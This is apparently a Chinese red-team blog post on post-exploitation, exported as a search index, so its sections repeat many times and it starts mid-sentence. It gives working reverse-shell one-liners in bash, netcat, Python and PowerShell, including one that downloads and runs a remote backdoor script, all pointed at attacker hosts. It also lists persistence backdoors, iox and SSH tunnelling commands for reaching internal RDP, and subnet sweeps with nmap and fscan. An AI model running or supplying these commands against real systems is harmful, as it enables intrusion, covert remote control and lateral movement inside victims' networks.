80 #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务； 4.3 传输层常用隧道IOX github：https://github.com/EddieIvan01/iox 使用，比如我们将内网的3389端口转发到我们的attackhost： target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 #-k启用加密 vps:./iox fwd -l *8888 -l 33890 -k 656565 socks代理 修改/etc/proxychains.conf 在本地0.0.0.0:1080启动Socks5服务 ./iox proxy -l 1080 在被控机开启Socks5服务，将服务转发到公网attackhost 在attackhost上转发0.0.0.0:9999到0.0.0.0:1080 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连 ./iox proxy -r 1.1.1.1:9999 ./iox proxy -l 9999 -l 1080 // 注意，这两个端口是有顺序的 接着连接内网主机 # proxychains.conf # socks5://1.1.1.1:1080 ​ $ proxychains rdesktop 192.168.0.100:3389 4.4 应用层常用隧道SSH ssh常用参数： -C 压缩传输 -f 后台执行SSH -N 建立静默连接 -g 允许远程主机连接本地用于转发的端口 -L 本地端口转发 -R 远程端口转发 -D 动态转发 -P 指定SSH端口 本地端口转发 攻击机：192.168.1.1 web服务器：192.168.1.2 数据库服务器：192.168.1.3 攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景 攻击机执行：ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22 攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 远程转发 攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口 在web服务器上执行：ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1 此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 动态转发 ① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2 ② 本地设置socks代理后即可访问数据库服务器 4.5 DNS（iodine）要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined； ","date":"2023-11-17","objectID":"/hvv_post_penetration/:3:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#42-网络层常用隧道"},{"categories":["hvv"],"content":"\r权限维持\r1.反弹shell nc attackhost:nc -lvp 9999 target:/bin/bash -i \u0026\u003e /dev/tcp/192.168.0.198/9999 \u003c\u00261 netcat nc -e /bin/bash 192.168.0.198 9999 powershell 将ps1放到attackhost上 powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.1\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2.webshell① 内存马隐藏 ② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合 3.系统后门\rWindows① 利用任务计划定时反弹会话 ② 利用开机启动项 ③ 影子账户以及guest账户 ④ 注册表 ⑤ 系统工具后门（shift后门） ⑥ WMI后门 ⑦ DLL劫持 ⑧ 进程注入 Linux① ssh、openssh后门 ② 任务计划 ③ VIM后门 ④ 添加超级用户 ⑤ SUID后门 ⑥ 利用自启动程序 ⑦ rootkit后门 4.利用IIS等服务制作后门常用隧道建立工具 4.1 探测是否出网 ICMP：ping IP； TCP：nc -zv ip 端口； HTTP：curl www.xxx； DNS：nslookup [www.baidu.com] 4.2 网络层常用隧道IPv6隧道 kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。 使用： 首先开启目标机上的IPV6,ipconfig查看ipv6地址 kali：6tunnel -4 80 targetipv6IP 80 #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务； 4.3 传输层常用隧道IOX github：https://github.com/EddieIvan01/iox 使用，比如我们将内网的3389端口转发到我们的attackhost： target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 #-k启用加密 vps:./iox fwd -l *8888 -l 33890 -k 656565 socks代理 修改/etc/proxychains.conf 在本地0.0.0.0:1080启动Socks5服务 ./iox proxy -l 1080 在被控机开启Socks5服务，将服务转发到公网attackhost 在attackhost上转发0.0.0.0:9999到0.0.0.0:1080 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连 ./iox proxy -r 1.1.1.1:9999 ./iox proxy -l 9999 -l 1080 // 注意，这两个端口是有顺序的 接着连接内网主机 # proxychains.conf # socks5://1.1.1.1:1080 ​ $ proxychains rdesktop 192.168.0.100:3389 4.4 应用层常用隧道SSH ssh常用参数： -C 压缩传输 -f 后台执行SSH -N 建立静默连接 -g 允许远程主机连接本地用于转发的端口 -L 本地端口转发 -R 远程端口转发 -D 动态转发 -P 指定SSH端口 本地端口转发 攻击机：192.168.1.1 web服务器：192.168.1.2 数据库服务器：192.168.1.3 攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景 攻击机执行：ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22 攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 远程转发 攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口 在web服务器上执行：ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1 此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 动态转发 ① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2 ② 本地设置socks代理后即可访问数据库服务器 4.5 DNS（iodine）要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined； ","date":"2023-11-17","objectID":"/hvv_post_penetration/:3:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#43-传输层常用隧道"},{"categories":["hvv"],"content":"\r权限维持\r1.反弹shell nc attackhost:nc -lvp 9999 target:/bin/bash -i \u0026\u003e /dev/tcp/192.168.0.198/9999 \u003c\u00261 netcat nc -e /bin/bash 192.168.0.198 9999 powershell 将ps1放到attackhost上 powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.1\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2.webshell① 内存马隐藏 ② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合 3.系统后门\rWindows① 利用任务计划定时反弹会话 ② 利用开机启动项 ③ 影子账户以及guest账户 ④ 注册表 ⑤ 系统工具后门（shift后门） ⑥ WMI后门 ⑦ DLL劫持 ⑧ 进程注入 Linux① ssh、openssh后门 ② 任务计划 ③ VIM后门 ④ 添加超级用户 ⑤ SUID后门 ⑥ 利用自启动程序 ⑦ rootkit后门 4.利用IIS等服务制作后门常用隧道建立工具 4.1 探测是否出网 ICMP：ping IP； TCP：nc -zv ip 端口； HTTP：curl www.xxx； DNS：nslookup [www.baidu.com] 4.2 网络层常用隧道IPv6隧道 kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。 使用： 首先开启目标机上的IPV6,ipconfig查看ipv6地址 kali：6tunnel -4 80 targetipv6IP 80 #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务； 4.3 传输层常用隧道IOX github：https://github.com/EddieIvan01/iox 使用，比如我们将内网的3389端口转发到我们的attackhost： target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 #-k启用加密 vps:./iox fwd -l *8888 -l 33890 -k 656565 socks代理 修改/etc/proxychains.conf 在本地0.0.0.0:1080启动Socks5服务 ./iox proxy -l 1080 在被控机开启Socks5服务，将服务转发到公网attackhost 在attackhost上转发0.0.0.0:9999到0.0.0.0:1080 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连 ./iox proxy -r 1.1.1.1:9999 ./iox proxy -l 9999 -l 1080 // 注意，这两个端口是有顺序的 接着连接内网主机 # proxychains.conf # socks5://1.1.1.1:1080 ​ $ proxychains rdesktop 192.168.0.100:3389 4.4 应用层常用隧道SSH ssh常用参数： -C 压缩传输 -f 后台执行SSH -N 建立静默连接 -g 允许远程主机连接本地用于转发的端口 -L 本地端口转发 -R 远程端口转发 -D 动态转发 -P 指定SSH端口 本地端口转发 攻击机：192.168.1.1 web服务器：192.168.1.2 数据库服务器：192.168.1.3 攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景 攻击机执行：ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22 攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 远程转发 攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口 在web服务器上执行：ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1 此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 动态转发 ① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2 ② 本地设置socks代理后即可访问数据库服务器 4.5 DNS（iodine）要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined； ","date":"2023-11-17","objectID":"/hvv_post_penetration/:3:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#44-应用层常用隧道"},{"categories":["hvv"],"content":"\r权限维持\r1.反弹shell nc attackhost:nc -lvp 9999 target:/bin/bash -i \u0026\u003e /dev/tcp/192.168.0.198/9999 \u003c\u00261 netcat nc -e /bin/bash 192.168.0.198 9999 powershell 将ps1放到attackhost上 powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.1\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2.webshell① 内存马隐藏 ② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合 3.系统后门\rWindows① 利用任务计划定时反弹会话 ② 利用开机启动项 ③ 影子账户以及guest账户 ④ 注册表 ⑤ 系统工具后门（shift后门） ⑥ WMI后门 ⑦ DLL劫持 ⑧ 进程注入 Linux① ssh、openssh后门 ② 任务计划 ③ VIM后门 ④ 添加超级用户 ⑤ SUID后门 ⑥ 利用自启动程序 ⑦ rootkit后门 4.利用IIS等服务制作后门常用隧道建立工具 4.1 探测是否出网 ICMP：ping IP； TCP：nc -zv ip 端口； HTTP：curl www.xxx； DNS：nslookup [www.baidu.com] 4.2 网络层常用隧道IPv6隧道 kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。 使用： 首先开启目标机上的IPV6,ipconfig查看ipv6地址 kali：6tunnel -4 80 targetipv6IP 80 #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务； 4.3 传输层常用隧道IOX github：https://github.com/EddieIvan01/iox 使用，比如我们将内网的3389端口转发到我们的attackhost： target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 #-k启用加密 vps:./iox fwd -l *8888 -l 33890 -k 656565 socks代理 修改/etc/proxychains.conf 在本地0.0.0.0:1080启动Socks5服务 ./iox proxy -l 1080 在被控机开启Socks5服务，将服务转发到公网attackhost 在attackhost上转发0.0.0.0:9999到0.0.0.0:1080 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连 ./iox proxy -r 1.1.1.1:9999 ./iox proxy -l 9999 -l 1080 // 注意，这两个端口是有顺序的 接着连接内网主机 # proxychains.conf # socks5://1.1.1.1:1080 ​ $ proxychains rdesktop 192.168.0.100:3389 4.4 应用层常用隧道SSH ssh常用参数： -C 压缩传输 -f 后台执行SSH -N 建立静默连接 -g 允许远程主机连接本地用于转发的端口 -L 本地端口转发 -R 远程端口转发 -D 动态转发 -P 指定SSH端口 本地端口转发 攻击机：192.168.1.1 web服务器：192.168.1.2 数据库服务器：192.168.1.3 攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景 攻击机执行：ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22 攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 远程转发 攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口 在web服务器上执行：ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1 此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 动态转发 ① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2 ② 本地设置socks代理后即可访问数据库服务器 4.5 DNS（iodine）要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined； ","date":"2023-11-17","objectID":"/hvv_post_penetration/:3:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#45-dnsiodine"},{"categories":["hvv"],"content":"\r横向移动通常进入内网后，同样会进行内网信息收集、域内信息收集，在通过收集的信息进行内网漫游横向渗透扩大战果，在内网漫游过程中，会重点关注邮件服务器权限、OA系统权限、版本控制服务器权限、集中运维管理平台权限、统一认证系统权限、域控权限等位置，尝试突破核心系统权限、控制核心业务、获取核心数据，最终完成目标突破工作。 内网主机存活探测\r1.ICMP Windows： for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" ​ C:\\Users\\test\u003efor /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" 来自 192.168.1.1 的回复: 字节=32 时间=2ms TTL=254 来自 192.168.1.3 的回复: 字节=32 时间=127ms TTL=64 来自 192.168.1.5 的回复: 字节=32 时间=14ms TTL=64 Linux： for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done ​ root@localhost:~# for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done 192.168.1.1 192.168.1.3 192.168.1.5 2.nmap ARP 扫描： nmap -PR -sn 192.168.1.0/24 ICMP 扫描： nmap ‐sP ‐PI 192.168.1.0/24 ‐T4 SNMP 扫描： nmap -sU --script snmp-brute 192.168.1.0/24 -T4 UDP 扫描： nmap -sU -T5 -sV --max-retries 1 192.168.1.1 -p 500 NetBIOS 扫描： nmap --script nbstat.nse -sU -p137 192.168.1.0/24 -T4 内网主机端口探测\r1.单个端口探测 telnet E:\\ipscan\u003etelnet 10.10.25.176 80 正在连接10.10.25.176...无法打开到主机的连接。 在端口 80: 连接失败 ​ NC root@localhost:~# nc -vv 10.10.12.162 22 Connection to 10.10.12.162 22 port [tcp/ssh] succeeded! SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5 2.多个端口探测 fscan https://github.com/shadow1ng/fscan fscan.exe -h 192.168.1.1/24 -p 1-65535 通过代理后使用nmap、msf进行扫描 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:4:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#横向移动"},{"categories":["hvv"],"content":"\r横向移动通常进入内网后，同样会进行内网信息收集、域内信息收集，在通过收集的信息进行内网漫游横向渗透扩大战果，在内网漫游过程中，会重点关注邮件服务器权限、OA系统权限、版本控制服务器权限、集中运维管理平台权限、统一认证系统权限、域控权限等位置，尝试突破核心系统权限、控制核心业务、获取核心数据，最终完成目标突破工作。 内网主机存活探测\r1.ICMP Windows： for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" ​ C:\\Users\\test\u003efor /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" 来自 192.168.1.1 的回复: 字节=32 时间=2ms TTL=254 来自 192.168.1.3 的回复: 字节=32 时间=127ms TTL=64 来自 192.168.1.5 的回复: 字节=32 时间=14ms TTL=64 Linux： for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done ​ root@localhost:~# for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done 192.168.1.1 192.168.1.3 192.168.1.5 2.nmap ARP 扫描： nmap -PR -sn 192.168.1.0/24 ICMP 扫描： nmap ‐sP ‐PI 192.168.1.0/24 ‐T4 SNMP 扫描： nmap -sU --script snmp-brute 192.168.1.0/24 -T4 UDP 扫描： nmap -sU -T5 -sV --max-retries 1 192.168.1.1 -p 500 NetBIOS 扫描： nmap --script nbstat.nse -sU -p137 192.168.1.0/24 -T4 内网主机端口探测\r1.单个端口探测 telnet E:\\ipscan\u003etelnet 10.10.25.176 80 正在连接10.10.25.176...无法打开到主机的连接。 在端口 80: 连接失败 ​ NC root@localhost:~# nc -vv 10.10.12.162 22 Connection to 10.10.12.162 22 port [tcp/ssh] succeeded! SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5 2.多个端口探测 fscan https://github.com/shadow1ng/fscan fscan.exe -h 192.168.1.1/24 -p 1-65535 通过代理后使用nmap、msf进行扫描 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:4:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#内网主机存活探测"},{"categories":["hvv"],"content":"\r横向移动通常进入内网后，同样会进行内网信息收集、域内信息收集，在通过收集的信息进行内网漫游横向渗透扩大战果，在内网漫游过程中，会重点关注邮件服务器权限、OA系统权限、版本控制服务器权限、集中运维管理平台权限、统一认证系统权限、域控权限等位置，尝试突破核心系统权限、控制核心业务、获取核心数据，最终完成目标突破工作。 内网主机存活探测\r1.ICMP Windows： for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" ​ C:\\Users\\test\u003efor /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" 来自 192.168.1.1 的回复: 字节=32 时间=2ms TTL=254 来自 192.168.1.3 的回复: 字节=32 时间=127ms TTL=64 来自 192.168.1.5 的回复: 字节=32 时间=14ms TTL=64 Linux： for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done ​ root@localhost:~# for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done 192.168.1.1 192.168.1.3 192.168.1.5 2.nmap ARP 扫描： nmap -PR -sn 192.168.1.0/24 ICMP 扫描： nmap ‐sP ‐PI 192.168.1.0/24 ‐T4 SNMP 扫描： nmap -sU --script snmp-brute 192.168.1.0/24 -T4 UDP 扫描： nmap -sU -T5 -sV --max-retries 1 192.168.1.1 -p 500 NetBIOS 扫描： nmap --script nbstat.nse -sU -p137 192.168.1.0/24 -T4 内网主机端口探测\r1.单个端口探测 telnet E:\\ipscan\u003etelnet 10.10.25.176 80 正在连接10.10.25.176...无法打开到主机的连接。 在端口 80: 连接失败 ​ NC root@localhost:~# nc -vv 10.10.12.162 22 Connection to 10.10.12.162 22 port [tcp/ssh] succeeded! SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5 2.多个端口探测 fscan https://github.com/shadow1ng/fscan fscan.exe -h 192.168.1.1/24 -p 1-65535 通过代理后使用nmap、msf进行扫描 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:4:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#1icmp"},{"categories":["hvv"],"content":"\r横向移动通常进入内网后，同样会进行内网信息收集、域内信息收集，在通过收集的信息进行内网漫游横向渗透扩大战果，在内网漫游过程中，会重点关注邮件服务器权限、OA系统权限、版本控制服务器权限、集中运维管理平台权限、统一认证系统权限、域控权限等位置，尝试突破核心系统权限、控制核心业务、获取核心数据，最终完成目标突破工作。 内网主机存活探测\r1.ICMP Windows： for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" ​ C:\\Users\\test\u003efor /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" 来自 192.168.1.1 的回复: 字节=32 时间=2ms TTL=254 来自 192.168.1.3 的回复: 字节=32 时间=127ms TTL=64 来自 192.168.1.5 的回复: 字节=32 时间=14ms TTL=64 Linux： for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done ​ root@localhost:~# for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done 192.168.1.1 192.168.1.3 192.168.1.5 2.nmap ARP 扫描： nmap -PR -sn 192.168.1.0/24 ICMP 扫描： nmap ‐sP ‐PI 192.168.1.0/24 ‐T4 SNMP 扫描： nmap -sU --script snmp-brute 192.168.1.0/24 -T4 UDP 扫描： nmap -sU -T5 -sV --max-retries 1 192.168.1.1 -p 500 NetBIOS 扫描： nmap --script nbstat.nse -sU -p137 192.168.1.0/24 -T4 内网主机端口探测\r1.单个端口探测 telnet E:\\ipscan\u003etelnet 10.10.25.176 80 正在连接10.10.25.176...无法打开到主机的连接。 在端口 80: 连接失败 ​ NC root@localhost:~# nc -vv 10.10.12.162 22 Connection to 10.10.12.162 22 port [tcp/ssh] succeeded! SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5 2.多个端口探测 fscan https://github.com/shadow1ng/fscan fscan.exe -h 192.168.1.1/24 -p 1-65535 通过代理后使用nmap、msf进行扫描 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:4:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#2nmap"},{"categories":["hvv"],"content":"\r横向移动通常进入内网后，同样会进行内网信息收集、域内信息收集，在通过收集的信息进行内网漫游横向渗透扩大战果，在内网漫游过程中，会重点关注邮件服务器权限、OA系统权限、版本控制服务器权限、集中运维管理平台权限、统一认证系统权限、域控权限等位置，尝试突破核心系统权限、控制核心业务、获取核心数据，最终完成目标突破工作。 内网主机存活探测\r1.ICMP Windows： for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" ​ C:\\Users\\test\u003efor /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" 来自 192.168.1.1 的回复: 字节=32 时间=2ms TTL=254 来自 192.168.1.3 的回复: 字节=32 时间=127ms TTL=64 来自 192.168.1.5 的回复: 字节=32 时间=14ms TTL=64 Linux： for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done ​ root@localhost:~# for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done 192.168.1.1 192.168.1.3 192.168.1.5 2.nmap ARP 扫描： nmap -PR -sn 192.168.1.0/24 ICMP 扫描： nmap ‐sP ‐PI 192.168.1.0/24 ‐T4 SNMP 扫描： nmap -sU --script snmp-brute 192.168.1.0/24 -T4 UDP 扫描： nmap -sU -T5 -sV --max-retries 1 192.168.1.1 -p 500 NetBIOS 扫描： nmap --script nbstat.nse -sU -p137 192.168.1.0/24 -T4 内网主机端口探测\r1.单个端口探测 telnet E:\\ipscan\u003etelnet 10.10.25.176 80 正在连接10.10.25.176...无法打开到主机的连接。 在端口 80: 连接失败 ​ NC root@localhost:~# nc -vv 10.10.12.162 22 Connection to 10.10.12.162 22 port [tcp/ssh] succeeded! SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5 2.多个端口探测 fscan https://github.com/shadow1ng/fscan fscan.exe -h 192.168.1.1/24 -p 1-65535 通过代理后使用nmap、msf进行扫描 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:4:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#内网主机端口探测"},{"categories":["hvv"],"content":"\r横向移动通常进入内网后，同样会进行内网信息收集、域内信息收集，在通过收集的信息进行内网漫游横向渗透扩大战果，在内网漫游过程中，会重点关注邮件服务器权限、OA系统权限、版本控制服务器权限、集中运维管理平台权限、统一认证系统权限、域控权限等位置，尝试突破核心系统权限、控制核心业务、获取核心数据，最终完成目标突破工作。 内网主机存活探测\r1.ICMP Windows： for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" ​ C:\\Users\\test\u003efor /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" 来自 192.168.1.1 的回复: 字节=32 时间=2ms TTL=254 来自 192.168.1.3 的回复: 字节=32 时间=127ms TTL=64 来自 192.168.1.5 的回复: 字节=32 时间=14ms TTL=64 Linux： for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done ​ root@localhost:~# for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done 192.168.1.1 192.168.1.3 192.168.1.5 2.nmap ARP 扫描： nmap -PR -sn 192.168.1.0/24 ICMP 扫描： nmap ‐sP ‐PI 192.168.1.0/24 ‐T4 SNMP 扫描： nmap -sU --script snmp-brute 192.168.1.0/24 -T4 UDP 扫描： nmap -sU -T5 -sV --max-retries 1 192.168.1.1 -p 500 NetBIOS 扫描： nmap --script nbstat.nse -sU -p137 192.168.1.0/24 -T4 内网主机端口探测\r1.单个端口探测 telnet E:\\ipscan\u003etelnet 10.10.25.176 80 正在连接10.10.25.176...无法打开到主机的连接。 在端口 80: 连接失败 ​ NC root@localhost:~# nc -vv 10.10.12.162 22 Connection to 10.10.12.162 22 port [tcp/ssh] succeeded! SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5 2.多个端口探测 fscan https://github.com/shadow1ng/fscan fscan.exe -h 192.168.1.1/24 -p 1-65535 通过代理后使用nmap、msf进行扫描 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:4:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#1单个端口探测"},{"categories":["hvv"],"content":"\r横向移动通常进入内网后，同样会进行内网信息收集、域内信息收集，在通过收集的信息进行内网漫游横向渗透扩大战果，在内网漫游过程中，会重点关注邮件服务器权限、OA系统权限、版本控制服务器权限、集中运维管理平台权限、统一认证系统权限、域控权限等位置，尝试突破核心系统权限、控制核心业务、获取核心数据，最终完成目标突破工作。 内网主机存活探测\r1.ICMP Windows： for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" ​ C:\\Users\\test\u003efor /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i \"ttl=\" 来自 192.168.1.1 的回复: 字节=32 时间=2ms TTL=254 来自 192.168.1.3 的回复: 字节=32 时间=127ms TTL=64 来自 192.168.1.5 的回复: 字节=32 时间=14ms TTL=64 Linux： for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done ​ root@localhost:~# for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep \"ttl\"|awk -F \"[ :]+\" '{print $4}'; done 192.168.1.1 192.168.1.3 192.168.1.5 2.nmap ARP 扫描： nmap -PR -sn 192.168.1.0/24 ICMP 扫描： nmap ‐sP ‐PI 192.168.1.0/24 ‐T4 SNMP 扫描： nmap -sU --script snmp-brute 192.168.1.0/24 -T4 UDP 扫描： nmap -sU -T5 -sV --max-retries 1 192.168.1.1 -p 500 NetBIOS 扫描： nmap --script nbstat.nse -sU -p137 192.168.1.0/24 -T4 内网主机端口探测\r1.单个端口探测 telnet E:\\ipscan\u003etelnet 10.10.25.176 80 正在连接10.10.25.176...无法打开到主机的连接。 在端口 80: 连接失败 ​ NC root@localhost:~# nc -vv 10.10.12.162 22 Connection to 10.10.12.162 22 port [tcp/ssh] succeeded! 